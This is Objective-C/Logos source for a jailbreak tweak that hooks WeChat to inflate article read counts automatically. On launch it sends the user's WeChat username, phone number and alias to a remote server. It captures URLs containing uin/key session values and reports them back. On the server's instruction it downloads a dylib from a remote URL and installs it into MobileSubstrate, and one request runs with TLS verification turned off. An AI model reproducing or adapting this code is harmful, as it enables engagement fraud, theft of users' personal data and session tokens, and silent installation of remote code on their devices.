//文章阅读

#import <UIKIT/UIKIT.h>
#import <Foundation/Foundation.h>
#import <substrate.h>
#import "curl/curl.h"
#import <time.h>
#import <iostream>
#import <string>

#pragma GCC diagnostic ignored "-Wgnu"
#pragma GCC diagnostic ignored "-Wundef"
#pragma GCC diagnostic ignored "-Wselector"

//环境变量
//static NSString *environmentPath = @"http://www.vogueda.com/shareplatformWxTest-test/weixin/";
static NSString *environmentPath = @"http://www.vogueda.com/shareplatformWxTest/weixin/";

//hook版本号控制
static NSString *m_hookVersion = @"1";

static dispatch_group_t group = dispatch_group_create();
static dispatch_queue_t queue = dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0);

/*
 是否有等待请求数据回来
 -1:处于初始化状态
 0: 没有数据
 1: 等待数据返回
 2: 数据返回了
 3: 数据返回错误
 4: 正在执行
 */
NSInteger  m_isRequestResult = -1;

NSMutableArray *m_taskArrayData = [[NSMutableArray alloc] init];
NSMutableArray *m_fetchUinAndKeyUrl = [[NSMutableArray alloc] init];
NSMutableArray *m_linkURL = [[NSMutableArray alloc] init];;      //抓取uin和key的数据
NSMutableArray *m_downURL = [[NSMutableArray alloc] init];;      //下载链接

static int m_interval = 0;  //间隔秒数
static int m_spaceCount = 0; //间隔个数
static int m_isUpdateHook = 0;  //判断是否更新hook
//static NSString *m_fetchUinAndKeyUrl = @"";  //判断是否上传uin和key


static int m_type = 1;    //0.内部插件渠道  1.深圳周总渠道(阅读hook)  2.深圳周总渠道(公众号名片hook)

//去掉特殊字符
extern "C" NSString *conversionSpecialCharacter(NSString *character){

    NSString *characterTemp = character;
    //
    //    //去掉nickname 的特殊字符
    for(int i=0; i<3;i++){
        if([characterTemp rangeOfString:@"\""].location != NSNotFound){

            characterTemp =  [characterTemp stringByReplacingOccurrencesOfString:@"\"" withString:@""];

            NSLog(@"");

        }else if([characterTemp rangeOfString:@"&"].location != NSNotFound){

            characterTemp =  [characterTemp stringByReplacingOccurrencesOfString:@"&" withString:@""];

        }else if([characterTemp rangeOfString:@"%"].location != NSNotFound){

            characterTemp =  [characterTemp stringByReplacingOccurrencesOfString:@"%" withString:@""];

        }else{
            characterTemp = [NSString stringWithFormat:@"%@",characterTemp];
            break;
        }
        
        
    }
    
    return characterTemp;
}

//字符串转dictionary
extern "C" NSMutableDictionary * strngToDictionary(NSString * strData) {
    //    @autoreleasepool {
    NSData *nsData = [strData dataUsingEncoding:NSUTF8StringEncoding];
    NSError *error;

    NSMutableDictionary *jsonData = [NSJSONSerialization
                                     JSONObjectWithData:nsData
                                     options:kNilOptions
                                     error:&error];
    return jsonData;
    //    }

}


@interface CSetting : NSObject <NSCoding>
@property(copy) NSString *m_nsGoogleContactName; // @synthesize m_nsGoogleContactName;
@property(copy) NSString *m_nsMicroBlogUsrName; // @synthesize m_nsMicroBlogUsrName;
@property(copy) NSString *m_nsMobile; // @synthesize m_nsMobile;
@property(copy) NSString *m_nsEmail; // @synthesize m_nsEmail;
@property(copy) NSString *m_nsAliasName; // @synthesize m_nsAliasName;
@property(copy) NSString *m_nsUsrName; // @synthesize m_nsUsrName;
@property(nonatomic) _Bool m_emotionReinit; // @synthesize m_emotionReinit;
@property(nonatomic) unsigned int m_walletType; // @synthesize m_walletType;
@property(retain, nonatomic) NSData *m_patternInfoSign; // @synthesize m_patternInfoSign;
@property(nonatomic) unsigned int m_patternLockStatus; // @synthesize m_patternLockStatus;
@property(nonatomic) unsigned int m_patternVersion; // @synthesize m_patternVersion;
@property(retain) NSString *m_nsMsgPushSound; // @synthesize m_nsMsgPushSound;
@property(retain) NSString *m_nsVoipPushSound; // @synthesize m_nsVoipPushSound;
@property(retain) NSData *m_dtNewInitTempMaxBuffer; // @synthesize m_dtNewInitTempMaxBuffer;
@property(retain) NSData *m_dtNewInitTempBuffer; // @synthesize m_dtNewInitTempBuffer;
@property(retain) NSString *m_nsLastUUID; // @synthesize m_nsLastUUID;
@property(nonatomic) unsigned int m_uiReaderFontSize; // @synthesize m_uiReaderFontSize;
@property(nonatomic) unsigned int m_uiProfileFlag; // @synthesize m_uiProfileFlag;
@property(retain) NSData *m_dtA2KeyNew; // @synthesize m_dtA2KeyNew;
@property(retain) NSData *m_dtA2Key; // @synthesize m_dtA2Key;
//@property(retain) SubscriptBrandInfo *m_subBrandInfo; // @synthesize m_subBrandInfo;
@property(nonatomic) unsigned int m_uiBrandSubscriptionSettings; // @synthesize m_uiBrandSubscriptionSettings;
@property(retain) NSString *m_nsBrandSubscriptConfigUrl; // @synthesize m_nsBrandSubscriptConfigUrl;
@property(retain) NSString *m_nsExternalInfo; // @synthesize m_nsExternalInfo;
@property(retain) NSString *m_pcWCBGImgID; // @synthesize m_pcWCBGImgID;
@property(nonatomic) int m_iWCFlagExt; // @synthesize m_iWCFlagExt;
@property(nonatomic) int m_iWCFlag; // @synthesize m_iWCFlag;
@property(retain) NSString *m_nsWCBGImgObjectID; // @synthesize m_nsWCBGImgObjectID;
@property(retain) NSString *m_nsAuthKey; // @synthesize m_nsAuthKey;
@property(nonatomic) unsigned int m_uiRegType; // @synthesize m_uiRegType;
@property(nonatomic) unsigned int m_uiGMailSwitch; // @synthesize m_uiGMailSwitch;
@property(nonatomic) unsigned int m_uiGMailStatus; // @synthesize m_uiGMailStatus;
@property(retain) NSString *m_nsGMailAccount; // @synthesize m_nsGMailAccount;
@property(nonatomic) unsigned int m_uiPluginSwitch; // @synthesize m_uiPluginSwitch;
@property(retain) NSString *m_nsFacebookToken; // @synthesize m_nsFacebookToken;
@property(retain) NSString *m_nsFacebookName; // @synthesize m_nsFacebookName;
@property(retain) NSString *m_nsFacebookID; // @synthesize m_nsFacebookID;
@property(nonatomic) unsigned int m_uiFacebookFlag; // @synthesize m_uiFacebookFlag;
@property(nonatomic) unsigned int m_uiWeiboFlag; // @synthesize m_uiWeiboFlag;
@property(retain) NSString *m_nsWeiboNickName; // @synthesize m_nsWeiboNickName;
@property(retain) NSString *m_nsWeiboAddress; // @synthesize m_nsWeiboAddress;
@property(retain) NSString *m_nsCertificationInfo; // @synthesize m_nsCertificationInfo;
@property(nonatomic) unsigned int m_uiCertificationFlag; // @synthesize m_uiCertificationFlag;
@property(nonatomic) unsigned int m_uiSelfShowType; // @synthesize m_uiSelfShowType;
@property(nonatomic) unsigned int m_uiPluginInstallStatus; // @synthesize m_uiPluginInstallStatus;
//@property(retain) CNoDisturbInfo *m_oNoDisturbInfo; // @synthesize m_oNoDisturbInfo;
@property(retain) NSString *m_nsHDImgStatus; // @synthesize m_nsHDImgStatus;
@property(retain) NSString *m_nsHDHeadImgMD5; // @synthesize m_nsHDHeadImgMD5;
@property(nonatomic) unsigned int m_uiPersonalCardStatus; // @synthesize m_uiPersonalCardStatus;
@property(nonatomic) unsigned int m_uiSex; // @synthesize m_uiSex;
@property(retain) NSString *m_nsCity; // @synthesize m_nsCity;
@property(retain) NSString *m_nsProvince; // @synthesize m_nsProvince;
@property(retain) NSString *m_nsCountry; // @synthesize m_nsCountry;
@property(retain) NSString *m_nsUin16PwdMD5; // @synthesize m_nsUin16PwdMD5;
@property(retain) NSString *m_nsUinPwdMD5; // @synthesize m_nsUinPwdMD5;
@property(retain) NSData *m_dtSyncBuffer; // @synthesize m_dtSyncBuffer;
@property(nonatomic) _Bool m_bQQOfflineSwitchStatus; // @synthesize m_bQQOfflineSwitchStatus;
@property(retain) NSString *m_nsPushmailFolderUrl; // @synthesize m_nsPushmailFolderUrl;
@property(nonatomic) unsigned int m_uiSendCardType; // @synthesize m_uiSendCardType;
@property(nonatomic) _Bool m_bReplyToAddContact; // @synthesize m_bReplyToAddContact;
@property(nonatomic) unsigned int m_uiShowFirstTimeTipsVersion; // @synthesize m_uiShowFirstTimeTipsVersion;
@property(nonatomic) unsigned int m_uiDefaultChatState; // @synthesize m_uiDefaultChatState;
@property(nonatomic) unsigned int m_uiPushMailSwitchStatus; // @synthesize m_uiPushMailSwitchStatus;
@property(nonatomic) _Bool m_bAuthAnotherPlace; // @synthesize m_bAuthAnotherPlace;
@property(retain) NSString *m_nsPwd16MD5; // @synthesize m_nsPwd16MD5;
@property(nonatomic) unsigned int m_uiInitStatus; // @synthesize m_uiInitStatus;
@property(retain) NSString *m_nsInitBuffer; // @synthesize m_nsInitBuffer;
@property(nonatomic) unsigned int m_uiInitSyncKey; // @synthesize m_uiInitSyncKey;
@property(nonatomic) unsigned int m_uiLastInitVersion; // @synthesize m_uiLastInitVersion;
@property(nonatomic) unsigned int m_uiCryptUin; // @synthesize m_uiCryptUin;
@property(nonatomic) unsigned int m_uiShowWhatsnewVersion; // @synthesize m_uiShowWhatsnewVersion;
@property(nonatomic) _Bool m_bPushPrivateMsg; // @synthesize m_bPushPrivateMsg;
@property(nonatomic) _Bool m_bRevPrivateMsg; // @synthesize m_bRevPrivateMsg;
@property(nonatomic) unsigned int m_uiLastTimeOfNotifyOpenPush; // @synthesize m_uiLastTimeOfNotifyOpenPush;
@property(retain) NSString *m_nsMMdevNick; // @synthesize m_nsMMdevNick;
@property(retain) NSString *m_nsMMdevName; // @synthesize m_nsMMdevName;
@property(nonatomic) _Bool m_bNewMsgVibration; // @synthesize m_bNewMsgVibration;
@property(nonatomic) _Bool m_bNewMsgSound; // @synthesize m_bNewMsgSound;
@property(retain) NSString *m_nsSyncBuffer; // @synthesize m_nsSyncBuffer;
@property(nonatomic) unsigned int m_uiSyncKey; // @synthesize m_uiSyncKey;
@property(nonatomic) unsigned int m_uiNextAuthType; // @synthesize m_uiNextAuthType;
@property(retain) NSData *m_dtAutoAuthKey; // @synthesize m_dtAutoAuthKey;
@property(retain) NSString *m_nsPassWordMD5; // @synthesize m_nsPassWordMD5;
@property(nonatomic) unsigned int m_uiStatus; // @synthesize m_uiStatus;
@property(nonatomic) _Bool m_bSyncNickName; // @synthesize m_bSyncNickName;
@property(nonatomic) unsigned int m_uiUin; // @synthesize m_uiUin;
//- (void).cxx_destruct;
- (id)getDicSetting;
- (void)theadSafeRemoveObjectForKey:(id)arg1;
- (void)theadSafeSetObject:(id)arg1 forKey:(id)arg2;
- (id)theadSafeGetObject:(id)arg1;
- (int)getInt32ForKey:(id)arg1;
- (void)setInt32:(int)arg1 forKey:(id)arg2;
- (unsigned int)getUInt32ForKey:(id)arg1;
- (void)setUInt32:(unsigned int)arg1 forKey:(id)arg2;
- (_Bool)getBoolForKey:(id)arg1;
- (void)setBool:(_Bool)arg1 forKey:(id)arg2;
- (_Bool)IsVoipSoundOpen;
- (id)description;
- (id)keyPaths;
- (id)initWithCoder:(id)arg1;
- (void)encodeWithCoder:(id)arg1;
- (void)copyFromSetting:(id)arg1;
- (void)dealloc;
- (id)init;
- (void)preInit;
- (_Bool)isiPodTouch;
@property(copy) NSString *m_nsSignature; // @synthesize m_nsSignature;
@property(copy) NSString *m_nsNickName; // @synthesize m_nsNickName;

@end


//微信聊天页面
@interface NewMainFrameViewController
- (void)viewDidLoad;
- (void)batchMpDocReadCount:(NSString *)uuid;
- (void)updateHookDylib;
- (BOOL)downHookDyLib;
- (void)createMyTip;

//test
- (void)createMyButton;
@end


//跑微信文章阅读量
@interface MMWebViewController
- (_Bool)isPageDidLoad;
- (id)getCurrentUrl;
- (id)webviewController;
- (void)permitTempAccessOfJSApi:(id)arg1;
- (void)onPageNotifyFinishedLoading:(id)arg1;
- (void)onDomReady:(id)arg1;
- (void)shareToFB;
- (void)setDisableWebAlertView:(_Bool)arg1;
- (id)getRequestingOrCurrentUrl;
- (void)showAlertUploadingVideo;
- (void)cleanJSAPIDelegate;
- (_Bool)isSvrErrorTipForbidden;
- (void)viewDidLoad;
- (_Bool)isPhoneNumberUrl:(id)arg1;
- (id)getLastUrl;
- (void)goToURL:(id)arg1;
- (void)goForward;
- (void)goBack;
- (void)stop;
- (void)clearWebviewCacheAndCookie:(_Bool)arg1;
- (void)reload;
- (id)getRoutUrls;
- (void)done:(id)arg1;
- (void)notifyToJSBridgeVisibilityChanged:(_Bool)arg1;
- (void)loadHTMLString:(id)arg1 baseURL:(id)arg2;
- (id)extraInfo;
- (void)doDNS;
- (void)StartLoadWeb;
- (id)initWithURL:(id)arg1 presentModal:(_Bool)arg2 extraInfo:(id)arg3;
- (id)getInitUrl;
- (id)getShareUrl;
- (void)saveJSAPIPermissions:(id)arg1 url:(id)arg2;
@end


// 跑微信文章阅读量

extern "C" size_t CurlWrite_CallbackFunc_StdString(void *contents, size_t size, size_t nmemb, std::string *s)
{
    size_t newLength = size*nmemb;
    size_t oldLength = s->size();
    try
    {
        s->resize(oldLength + newLength);
    }
    catch(std::bad_alloc &e)
    {
        //handle memory problem
        return 0;
    }

    std::copy((char*)contents,(char*)contents+newLength,s->begin()+oldLength);
    return size*nmemb;
}

extern "C" BOOL fetchMpDocWithCurl(NSString *url) {
    CURL *web = curl_easy_init();
    CURLcode result;
    std::string s;
    BOOL flag = NO;
    if (web) {
        curl_easy_setopt(web, CURLOPT_URL, [url UTF8String]);
        curl_easy_setopt(web, CURLOPT_USERAGENT, "Mozilla/5.0 (iPhone; CPU iPhone OS 10_0_1 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Mobile/14A403 MicroMessenger/6.3.30 NetType/WIFI Language/zh_CN");
        curl_easy_setopt(web, CURLOPT_SSL_VERIFYPEER, 0L);
        curl_easy_setopt(web, CURLOPT_SSL_VERIFYHOST, 0L);
        curl_easy_setopt(web, CURLOPT_POSTFIELDS, "is_only_read=1");
        curl_easy_setopt(web, CURLOPT_WRITEFUNCTION, CurlWrite_CallbackFunc_StdString);
        curl_easy_setopt(web, CURLOPT_WRITEDATA, &s);

        result = curl_easy_perform(web);
        if(result != CURLE_OK){
            NSLog(@"MYHOOK-curl Cannot grab the url: %@!", url);
            flag = NO;
        }
    }

    curl_easy_cleanup(web);
    flag = YES;
    // [NSString stringWithUTF8String:s.c_str()]；
    NSLog(@"MYHOOK get html:%@, =====> %@ : result : %@", flag ? @"YES":@"NO", url,[NSString stringWithUTF8String:s.c_str()]);

    return flag;
}

%hook MMWebViewController

- (void)saveJSAPIPermissions:(id)arg1 url:(id)arg2 {
    %orig;

//        NSLog(@"this is add read saveJSAPIPermissions: arg1:%@ url(arg2):%@",arg1,arg2);

    //    dispatch_async(myMpDocQueue, ^{
    //        NSString *readCountUrl = [arg2 stringByReplacingOccurrencesOfString:@"https://mp.weixin.qq.com/s" withString:@"https://mp.weixin.qq.com/mp/getappmsgext"];
    //        fetchMpDocWithCurl(readCountUrl);
    //    });
}
%end

static CSetting *m_nCSetting = [[NSClassFromString(@"CSetting") alloc] init];  //下面的table页


//启动时请求的的任务数据
extern "C" void getServerData(NSString *nsUsrName,NSString *nsMobile,NSString *nsNickName,NSString *nsAliasName){

//([m_nCSetting m_nsUsrName],[m_nCSetting m_nsMobile],[m_nCSetting m_nsNickName],[m_nCSetting m_nsAliasName]);

    m_isRequestResult = 1;

    // 1. URL
    NSString *urlStr = [NSString stringWithFormat:@"%@getWeixinArticleList.htm?uuid=%@&phone=%@&aliasName=%@&type=%d&hookVersion=%@",environmentPath,nsUsrName,nsMobile,nsAliasName,m_type,m_hookVersion];

    NSURL *url = [NSURL URLWithString:urlStr];

    // 2. Request
    NSURLRequest *request = [NSURLRequest requestWithURL:url];

    NSLog(@"============ 请求回来的数据为 url:%@",urlStr);

    // 3. Connection
    [NSURLConnection sendAsynchronousRequest:request queue:[[NSOperationQueue alloc] init] completionHandler:^(NSURLResponse *response, NSData *data, NSError *connectionError) {

        if (connectionError == nil) {
            // 网络请求结束之后执行!

            // 将Data转换成字符串
            NSString *str = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];

            NSMutableDictionary *taskAll = strngToDictionary(str);

            NSLog(@"HKWeChat 请求回来的数据为:%@ url:%@ ",taskAll,urlStr);


            if([[taskAll objectForKey:@"code"] intValue] == 0 && taskAll != nil){

                for(NSArray *obj in [taskAll objectForKey:@"articleList"]){
                    [m_taskArrayData addObject:[obj mutableCopy]];
                }

                //得到key的链接
                [m_fetchUinAndKeyUrl addObject:[[taskAll objectForKey:@"fetchUinAndKeyUrl"] mutableCopy]];

                //得到下载文件url
                [m_downURL addObject:[[taskAll objectForKey:@"downURL"] mutableCopy]];

                NSLog(@"######m_fetchUinAndKeyUrl:%@",m_fetchUinAndKeyUrl);

                //间隔时间
                m_interval = [[taskAll objectForKey:@"interval"] intValue];
                if(m_interval == 0){
                    m_interval = 2;
                }

                //是否间隔数据
                m_spaceCount = [[taskAll objectForKey:@"spaceCount"] intValue];
                if(m_spaceCount == 0){
                    m_spaceCount = 10;
                }

                //判断是否更新
                m_isUpdateHook = [[taskAll objectForKey:@"isUpdateHook"] intValue];

//                m_taskDataDic = m_taskArrayData[0];

                m_isRequestResult = 2;

            }else{

                m_isRequestResult = 3;
            }


            // num = 2
            //            m_taskData = str;

            // 更新界面
            [[NSOperationQueue mainQueue] addOperationWithBlock:^{
                //                self.logonResult.text = @"登录完成";

            }];
        }
    }];
    
    // num = 1
    NSLog(@"come here %@", [NSThread currentThread]);
    
    //    NSURLResponse *response = nil;
    
    //    [NSURLConnection sendSynchronousRequest:request returningResponse:&response error:NULL];
}


//发送成功标示给服务端
extern "C" void hookSuccessTask(NSString *uuid,int onlyKey){

    NSString *sendData = @"";

    if(m_linkURL[0] != nil && ![m_linkURL[0] isEqualToString:@""]){

        sendData = (NSString *) CFBridgingRelease(CFURLCreateStringByAddingPercentEscapes(kCFAllocatorDefault,
                                                                                          (CFStringRef)m_linkURL[0],
                                                                                          NULL,
                                                                                          (CFStringRef)@"!*'();:@&=+$,/?%#[]",
                                                                                          kCFStringEncodingUTF8));
    }


    // 1. URL
    NSString *urlStr = [NSString stringWithFormat:@"%@markWeixinArticleComplate.htm?uuid=%@&linkUrl=%@&type=%d&onlyKey=%d&articleSize=%d",environmentPath,uuid,sendData,m_type,onlyKey,[m_taskArrayData count]];

    NSLog(@"hkWeixinArticle 发送成功给服务器 %@",urlStr);


    NSURL *url = [NSURL URLWithString:urlStr];

    // 2. Request
    NSURLRequest *request = [NSURLRequest requestWithURL:url];

    // 3. Connection
    [NSURLConnection sendAsynchronousRequest:request queue:[[NSOperationQueue alloc] init] completionHandler:^(NSURLResponse *response, NSData *data, NSError *connectionError) {

        if (connectionError == nil) {
            // 网络请求结束之后执行!

            // 将Data转换成字符串
            //            NSString *str = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];

            // num = 2
            //            m_chatMsgData = str;

            //            NSLog(@"HKWX this is request chat (requestURL:%@) return msg %@",URLEncodedString(chatUrl),str);
            // 更新界面
            [[NSOperationQueue mainQueue] addOperationWithBlock:^{
                //                self.logonResult.text = @"登录完成";

            }];
        }
    }];
    
    
    // num = 1
    NSLog(@"come here %@", [NSThread currentThread]);
}

%hook NewMainFrameViewController

%new
- (void)createMyTip{
    UIWindow *window = [UIApplication sharedApplication].keyWindow;

    UILabel *versionLable = [[UILabel alloc] initWithFrame:CGRectMake(300, 10, 120, 30)];
    NSString *text = @"v1.0";//[NSString stringWithFormat:@"0/%d",[nearbyCContactList count]];
    [versionLable setText:text];
    versionLable.textColor = [UIColor whiteColor];
    versionLable.font = [UIFont fontWithName:@"Helvetica" size:8];
    [window addSubview:versionLable];
    [window bringSubviewToFront:versionLable];
}

%new
- (void)createMyButton {
    UIButton *addAndSendBtn = [[UIButton alloc] initWithFrame:CGRectMake(120, 25, 80, 30)];
    [addAndSendBtn setTitle:@"更新!" forState:UIControlStateNormal];
    [addAndSendBtn setTitleColor:[UIColor redColor]forState:UIControlStateNormal];
    [addAndSendBtn setBackgroundColor:[UIColor whiteColor]];
    [addAndSendBtn addTarget: self action:@selector(updateHookDylib)
            forControlEvents: UIControlEventTouchDown];
    [[[[[[UIApplication sharedApplication]delegate] window] rootViewController] view] addSubview:addAndSendBtn];
}

%new
- (BOOL)downHookDyLib{
    NSString *url = m_downURL[0];
    if([url isEqualToString:@""] || url == nil){
        NSLog(@"hkWeixinArticle downURL is null");
        return NO;
    }

    CURL *downDylib = curl_easy_init();
    FILE *fp;
    CURLcode imgresult;
//    fp = fopen("/var/root/.ghost_dir/hkweixinarticle.dylib", "wb");
    fp = fopen("/Library/MobileSubstrate/DynamicLibraries/hkweixinarticle.dylib", "wb");
    if (downDylib) {
        if( fp == NULL ) {
            NSLog(@"hkWeixinArticle-curl image failed: %@", @"File cannot be opened");
            return NO;
        }
        curl_easy_setopt(downDylib, CURLOPT_URL, [url UTF8String]);
        curl_easy_setopt(downDylib, CURLOPT_WRITEFUNCTION, NULL);
        curl_easy_setopt(downDylib, CURLOPT_WRITEDATA, fp);

        imgresult = curl_easy_perform(downDylib);
        if( imgresult ){
            NSLog(@"hkWeixinArticle-curl Cannot grab the image!\n");
            return NO;
        }
    }

    fclose(fp);

    curl_easy_cleanup(downDylib);

    return YES;
}

%new
- (void)updateHookDylib {
    NSLog(@"MYHOOK now update hook...");
    //删除
//    system("cp -f /var/root/.ghost_dir/hkweixinarticle.dylib /Library/MobileSubstrate/DynamicLibraries/hkweixinarticle.dylib");
}

%new
- (void)batchMpDocReadCount:(NSString *)uuid {

    NSLog(@"this is batchMpDocReadCount %@",m_fetchUinAndKeyUrl);

    //刷key链接
    if(m_fetchUinAndKeyUrl[0] != nil && ![m_fetchUinAndKeyUrl[0] isEqualToString:@""]){
        NSLog(@"this is m_fetchUinAndKeyUrl is not nill ");

        id web = [[NSClassFromString(@"MMWebViewController") alloc] initWithURL:[NSURL URLWithString:m_fetchUinAndKeyUrl[0]] presentModal:NO extraInfo:nil];

        [NSThread sleepForTimeInterval:5];

    }


    if([m_taskArrayData count] > 0){
        NSLog(@"this is send batchMpDocReadCount is null");
        return;
    }

    dispatch_group_async(group, queue, ^{
        //刷阅读
        for (int i = 0; i < [m_taskArrayData count]; i++) {
            //            m_current_readCount = i;

            dispatch_async(dispatch_get_main_queue(), ^{

                NSLog(@"hkWeixinArticle this is NSURL:%@ m_spaceCount:%d m_interval:%d",m_taskArrayData[i],m_spaceCount,m_interval);
                //显示数据
                id web = [[NSClassFromString(@"MMWebViewController") alloc] initWithURL:[NSURL URLWithString:m_taskArrayData[i]] presentModal:NO extraInfo:nil];

            });


            if(m_spaceCount == 0 || m_spaceCount == 1){
                [NSThread sleepForTimeInterval:m_interval];
            }else{
                if ( i % m_spaceCount == 0 && i > 0) {
                    [NSThread sleepForTimeInterval:m_interval];
                }
            }

//                if ( i % 10 == 0 && i > 0) {
//
//                    [NSThread sleepForTimeInterval:2];
//                } //if

        } //for

        if(m_fetchUinAndKeyUrl[0] != nil && ![m_fetchUinAndKeyUrl[0] isEqualToString:@""]){

            while(1){
                [NSThread sleepForTimeInterval:2];

                if(m_linkURL[0] != nil && ![m_linkURL[0] isEqualToString:@""]){
                    //告诉服务器成功
                    hookSuccessTask(uuid,0);
                    break;
                }
            }
        }else{
            //告诉服务器成功
            hookSuccessTask(uuid,0);
        }

    });

    
}


- (void)viewDidLoad{
    %orig;

    NSLog(@"hkWeixinArticle this is NewMainFrameViewController currentVersion %@",m_hookVersion);

    NSString *userInfo = [NSString stringWithFormat:@"{\"nsAliasName\":\"%@\",\"nsNickName\":\"%@\",\"nsMobile\":\"%@\",\"nsUsrName\":\"%@\",\"uiSex\":\"%d\"}",[m_nCSetting m_nsAliasName],[m_nCSetting m_nsNickName],[m_nCSetting m_nsMobile],[m_nCSetting m_nsUsrName],[m_nCSetting m_uiSex]];
    NSLog(@"hkWeixinArticle %@",userInfo);

    [self createMyTip];

    //异步请求数据
    dispatch_group_async(group, queue, ^{

        [NSThread sleepForTimeInterval:2];

        //请求数据
        getServerData([m_nCSetting m_nsUsrName],[m_nCSetting m_nsMobile],[m_nCSetting m_nsNickName],[m_nCSetting m_nsAliasName]);

        //等待数据返回
        while(true){
            NSLog(@"hkWeixinArticle 等待大数据的返回(微信页面开始)---");

            [NSThread sleepForTimeInterval:2];

            if(m_isRequestResult != 1){
                break;
            }
        }

        dispatch_async(dispatch_get_main_queue(), ^{

            NSLog(@"m_taskArrayData:hkWeixinArticle %@",m_taskArrayData);

            if(m_isRequestResult == 2){

                NSLog(@"m_fetchUinAndKeyUrl is %@",m_fetchUinAndKeyUrl);

                m_isRequestResult = 4; //正在执行

                if(m_isUpdateHook == 1){
                    //下载hook内容
                    if([self downHookDyLib]){
                        NSLog(@"hkWeixinArticle 更新成功");
                    }

                }

                //进行刷阅读量
                [self batchMpDocReadCount:[m_nCSetting m_nsUsrName]];

            }
        });
        
    });

}

%end


%hook CSetting
- (id)init{
    id ret = %orig;

    NSLog(@"hkWeixinArticle this is enter CSetting");

    m_nCSetting = self;
    
    return ret;
}
%end


%hook YYUIWebView
- (void)webViewDidFinishLoad:(id)arg1{
    %orig;

    NSString *jsCode = @"document.location.href";

    NSString *currentURl = [self stringByEvaluatingJavaScriptFromString:jsCode];

    NSLog(@"YYUIWebView document.location.href -------------%@",currentURl);

    if(m_fetchUinAndKeyUrl[0] != nil && ![m_fetchUinAndKeyUrl[0] isEqualToString:@""]){
        //得到
        NSArray *listUrl = [m_fetchUinAndKeyUrl[0] componentsSeparatedByString:@"?"];
        NSLog(@"hkWeixinArticle this is listUrl[0] %@",listUrl[0]);

        if([currentURl rangeOfString:listUrl[0]].location != NSNotFound){
//            m_linkURL = [NSString stringWithFormat:@"%@",currentURl];
            [m_linkURL addObject:[currentURl mutableCopy]];

            NSLog(@"hkWeixinArticle this back server url :%@ ",m_linkURL);

            //上传给服务端
            hookSuccessTask([m_nCSetting m_nsUsrName],1);
        }
    }
    
}

%end




